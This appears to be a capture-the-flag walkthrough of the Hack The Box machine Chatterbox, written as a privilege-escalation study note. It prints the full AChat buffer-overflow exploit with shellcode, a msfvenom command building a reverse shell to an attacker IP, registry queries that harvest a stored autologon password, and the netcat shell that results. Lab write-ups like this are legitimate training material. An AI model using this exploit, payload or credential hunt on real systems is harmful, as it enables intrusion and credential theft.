
For this example we will be using the [Chatterbox](https://app.hackthebox.com/machines/123) machine from Hack the Box. The initial exploitation to gain foothold of the box will be at the end of the note.

When we have gained access to a machine, we can search for any clear text passwords present in the [[TCM/Windows Priv Esc/Initial Enumeration#^650019|system.]]

One interesting place we can check is registry data using the `reg query` command.

```PowerShell
C:\Users\Alfred\Desktop>reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword
.
.
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BEEB-D33A-4A4B-BF23-BBEF4663D017}\Children\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ 
.
.
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

End of search: 49 match(es) found.
```

This would result in multiple hits that are not much interesting to us. However, within the output, we can see an interesting result.  

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon  DefaultPassword    REG_SZ    Welcome1!`

We can look further into the `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` registry entry to obtain more details.

```PowerShell
C:\Users\Alfred\Desktop>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!
```

It seems to be that the user `Alfred` has the password `Welcome1!` set as their default password.

## Gaining a Foothold

The initial nmap scan of the box returns us the following result.

```bash
$ cat all                
# Nmap 7.95 scan initiated Tue Jul  8 14:38:35 2025 as: /usr/lib/nmap/nmap -sS -p- -Pn --min-rate=5000 -oN all 10.10.10.74
Nmap scan report for 10.10.10.74
Host is up (0.34s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9255/tcp  open  mon
9256/tcp  open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

We can see there are 2 uncommon ports present in the nmap scan, port *9255* and *9256*. If we use the default scripts to specifically scan those two ports we get the following.

```bash
$ sudo nmap -sC -sV -v -p9255,9256 10.10.10.74
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 20:10 AEST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Initiating Ping Scan at 20:10
Scanning 10.10.10.74 [4 ports]
Completed Ping Scan at 20:10, 0.35s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:10
Completed Parallel DNS resolution of 1 host. at 20:10, 0.00s elapsed
Initiating SYN Stealth Scan at 20:10
Scanning 10.10.10.74 [2 ports]
Discovered open port 9255/tcp on 10.10.10.74
Discovered open port 9256/tcp on 10.10.10.74
Completed SYN Stealth Scan at 20:10, 0.35s elapsed (2 total ports)
Initiating Service scan at 20:10
Scanning 2 services on 10.10.10.74
Service scan Timing: About 50.00% done; ETC: 20:13 (0:01:30 remaining)
Completed Service scan at 20:12, 89.87s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.74.
Initiating NSE at 20:12
Completed NSE at 20:12, 1.34s elapsed
Initiating NSE at 20:12
Completed NSE at 20:12, 3.29s elapsed
Initiating NSE at 20:12
Completed NSE at 20:12, 0.00s elapsed
Nmap scan report for 10.10.10.74
Host is up (0.33s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-title: Site doesn\'t have a title.
|_http-server-header: AChat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
9256/tcp open  achat   AChat chat system

NSE: Script Post-scanning.
Initiating NSE at 14:40
Completed NSE at 14:40, 0.00s elapsed
Initiating NSE at 14:40
Completed NSE at 14:40, 0.00s elapsed
Initiating NSE at 14:40
Completed NSE at 14:40, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.94 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

```

The box seems to run a service called **AChat** running. If we search `searchsploit` for known exploits for the service, we get the following.

```bash
$ searchsploit achat                                       
--------------------------------------------------------------------
 Exploit Title                             |  Path
------------------------------------------- -----------------------
Achat 0.150 beta7 - Remote Buffer Overflow | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit) | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal | php/webapps/24647.txt
-------------------------------------------- ------------------------
Shellcodes: No Results
```

There seems to be a Remote Buffer Overflow exploit available at `windows/remote/36025.py`. We can try to see what the code does by looking at the source code.

```bash
$ cp /usr/share/exploitdb/exploits/windows/remote/36025.py ./
$ cat 36025.py                                               
#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x77\x78\x62\x62"
buf += "\x69\x70\x59\x70\x4b\x50\x73\x30\x43\x59\x5a\x45\x50"
buf += "\x31\x67\x50\x4f\x74\x34\x4b\x50\x50\x4e\x50\x34\x4b"
buf += "\x30\x52\x7a\x6c\x74\x4b\x70\x52\x4e\x34\x64\x4b\x63"
buf += "\x42\x4f\x38\x4a\x6f\x38\x37\x6d\x7a\x4d\x56\x4d\x61"
buf += "\x49\x6f\x74\x6c\x4f\x4c\x6f\x71\x33\x4c\x69\x72\x4e"
buf += "\x4c\x4f\x30\x66\x61\x58\x4f\x5a\x6d\x59\x71\x67\x57"
buf += "\x68\x62\x48\x72\x52\x32\x50\x57\x54\x4b\x72\x32\x4e"
buf += "\x30\x64\x4b\x6e\x6a\x4d\x6c\x72\x6b\x70\x4c\x4a\x71"
buf += "\x43\x48\x39\x53\x71\x38\x6a\x61\x36\x71\x4f\x61\x62"
buf += "\x6b\x42\x39\x4f\x30\x4a\x61\x38\x53\x62\x6b\x30\x49"
buf += "\x6b\x68\x58\x63\x4e\x5a\x6e\x69\x44\x4b\x6f\x44\x72"
buf += "\x6b\x4b\x51\x36\x76\x70\x31\x69\x6f\x46\x4c\x57\x51"
buf += "\x48\x4f\x4c\x4d\x6a\x61\x55\x77\x4f\x48\x57\x70\x54"
buf += "\x35\x49\x66\x49\x73\x51\x6d\x7a\x58\x6d\x6b\x53\x4d"
buf += "\x4e\x44\x34\x35\x38\x64\x62\x38\x62\x6b\x52\x38\x6b"
buf += "\x74\x69\x71\x4a\x33\x33\x36\x54\x4b\x7a\x6c\x6e\x6b"
buf += "\x72\x6b\x51\x48\x6d\x4c\x6b\x51\x67\x63\x52\x6b\x49"
buf += "\x74\x72\x6b\x4d\x31\x7a\x30\x44\x49\x51\x34\x6e\x44"
buf += "\x4b\x74\x61\x4b\x51\x4b\x4f\x71\x51\x49\x71\x4a\x52"
buf += "\x31\x49\x6f\x69\x50\x31\x4f\x51\x4f\x6e\x7a\x34\x4b"
buf += "\x6a\x72\x38\x6b\x44\x4d\x71\x4d\x50\x6a\x59\x71\x64"
buf += "\x4d\x35\x35\x65\x62\x4b\x50\x49\x70\x4b\x50\x52\x30"
buf += "\x32\x48\x6c\x71\x64\x4b\x72\x4f\x51\x77\x59\x6f\x79"
buf += "\x45\x45\x6b\x48\x70\x75\x65\x35\x52\x30\x56\x72\x48"
buf += "\x33\x76\x35\x45\x37\x4d\x63\x6d\x49\x6f\x37\x65\x6d"
buf += "\x6c\x6a\x66\x31\x6c\x79\x7a\x51\x70\x4b\x4b\x67\x70"
buf += "\x53\x45\x6d\x35\x55\x6b\x31\x37\x4e\x33\x32\x52\x30"
buf += "\x6f\x42\x4a\x6d\x30\x50\x53\x79\x6f\x37\x65\x70\x63"
buf += "\x53\x31\x72\x4c\x30\x63\x4c\x6e\x70\x65\x32\x58\x50"
buf += "\x65\x6d\x30\x41\x41"


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('192.168.91.130', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40"
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close() 
```

The default behaviour of the code seems to be opening the calculator app as a PoC. We need to change the payload to spawn a reverse shell to out machine and replace the payload.

```bash
$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=6666 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3822 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x39\x6c\x77\x78\x43\x52\x79\x70"
buf += b"\x4b\x50\x59\x70\x63\x30\x73\x59\x5a\x45\x6d\x61"
buf += b"\x45\x70\x73\x34\x52\x6b\x72\x30\x30\x30\x44\x4b"
buf += b"\x4f\x62\x7a\x6c\x64\x4b\x70\x52\x7a\x74\x42\x6b"
buf += b"\x51\x62\x4b\x78\x7a\x6f\x44\x77\x6e\x6a\x6d\x56"
buf += b"\x4d\x61\x79\x6f\x44\x6c\x6f\x4c\x31\x51\x63\x4c"
buf += b"\x4c\x42\x6c\x6c\x4f\x30\x49\x31\x46\x6f\x6a\x6d"
buf += b"\x59\x71\x45\x77\x78\x62\x39\x62\x4f\x62\x61\x47"
buf += b"\x42\x6b\x71\x42\x4c\x50\x44\x4b\x4f\x5a\x4f\x4c"
buf += b"\x64\x4b\x50\x4c\x4c\x51\x53\x48\x37\x73\x4d\x78"
buf += b"\x6a\x61\x68\x51\x32\x31\x54\x4b\x31\x49\x4b\x70"
buf += b"\x6b\x51\x37\x63\x64\x4b\x6f\x59\x6e\x38\x7a\x43"
buf += b"\x4c\x7a\x4f\x59\x32\x6b\x6c\x74\x72\x6b\x7a\x61"
buf += b"\x57\x66\x6c\x71\x6b\x4f\x44\x6c\x59\x31\x68\x4f"
buf += b"\x4c\x4d\x4a\x61\x66\x67\x30\x38\x37\x70\x52\x55"
buf += b"\x6a\x56\x4b\x53\x63\x4d\x68\x78\x4f\x4b\x61\x6d"
buf += b"\x6c\x64\x72\x55\x38\x64\x52\x38\x32\x6b\x32\x38"
buf += b"\x4c\x64\x59\x71\x66\x73\x31\x56\x72\x6b\x7a\x6c"
buf += b"\x50\x4b\x34\x4b\x30\x58\x4b\x6c\x49\x71\x66\x73"
buf += b"\x54\x4b\x39\x74\x72\x6b\x4b\x51\x48\x50\x71\x79"
buf += b"\x6f\x54\x6b\x74\x6f\x34\x51\x4b\x51\x4b\x6f\x71"
buf += b"\x4e\x79\x30\x5a\x62\x31\x39\x6f\x49\x50\x31\x4f"
buf += b"\x6f\x6f\x4e\x7a\x52\x6b\x6e\x32\x58\x6b\x44\x4d"
buf += b"\x71\x4d\x33\x38\x6e\x53\x70\x32\x4b\x50\x69\x70"
buf += b"\x53\x38\x31\x67\x53\x43\x6e\x52\x31\x4f\x52\x34"
buf += b"\x63\x38\x50\x4c\x63\x47\x6e\x46\x59\x77\x69\x6f"
buf += b"\x66\x75\x46\x58\x46\x30\x4d\x31\x39\x70\x59\x70"
buf += b"\x6e\x49\x49\x34\x50\x54\x50\x50\x72\x48\x6f\x39"
buf += b"\x61\x70\x70\x6b\x79\x70\x4b\x4f\x48\x55\x32\x30"
buf += b"\x62\x30\x30\x50\x72\x30\x6d\x70\x50\x50\x6d\x70"
buf += b"\x32\x30\x73\x38\x37\x7a\x6a\x6f\x57\x6f\x67\x70"
buf += b"\x49\x6f\x7a\x35\x46\x37\x52\x4a\x4d\x35\x51\x58"
buf += b"\x59\x7a\x79\x7a\x5a\x6e\x4a\x73\x43\x38\x39\x72"
buf += b"\x4b\x50\x4d\x4a\x39\x7a\x72\x69\x39\x56\x31\x5a"
buf += b"\x4e\x30\x71\x46\x4f\x67\x32\x48\x52\x79\x57\x35"
buf += b"\x53\x44\x73\x31\x59\x6f\x67\x65\x51\x75\x39\x30"
buf += b"\x54\x34\x4c\x4c\x49\x6f\x6e\x6e\x5a\x68\x51\x65"
buf += b"\x7a\x4c\x51\x58\x6a\x50\x76\x55\x73\x72\x31\x46"
buf += b"\x6b\x4f\x37\x65\x32\x48\x33\x33\x30\x6d\x62\x44"
buf += b"\x49\x70\x54\x49\x5a\x43\x62\x37\x62\x37\x32\x37"
buf += b"\x6d\x61\x58\x76\x71\x5a\x6a\x72\x71\x49\x6e\x76"
buf += b"\x47\x72\x59\x6d\x72\x46\x48\x47\x61\x34\x6c\x64"
buf += b"\x4d\x6c\x4b\x51\x6b\x51\x42\x6d\x6f\x54\x4d\x54"
buf += b"\x6a\x70\x46\x66\x4b\x50\x6e\x64\x30\x54\x72\x30"
buf += b"\x42\x36\x42\x36\x42\x36\x4f\x56\x50\x56\x30\x4e"
buf += b"\x70\x56\x72\x36\x32\x33\x6f\x66\x61\x58\x51\x69"
buf += b"\x76\x6c\x6d\x6f\x55\x36\x4b\x4f\x48\x55\x71\x79"
buf += b"\x4b\x30\x70\x4e\x51\x46\x50\x46\x49\x6f\x50\x30"
buf += b"\x53\x38\x79\x78\x65\x37\x6d\x4d\x63\x30\x79\x6f"
buf += b"\x38\x55\x37\x4b\x7a\x50\x44\x75\x54\x62\x50\x56"
buf += b"\x62\x48\x76\x46\x43\x65\x37\x4d\x33\x6d\x69\x6f"
buf += b"\x66\x75\x4f\x4c\x4a\x66\x73\x4c\x4b\x5a\x31\x70"
buf += b"\x49\x6b\x57\x70\x70\x75\x4a\x65\x55\x6b\x4e\x67"
buf += b"\x6d\x43\x73\x42\x42\x4f\x6f\x7a\x79\x70\x62\x33"
buf += b"\x39\x6f\x76\x75\x41\x41"
```

After we start the listener, we can execute the BoF attack and obtain a shell.

```bash
$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```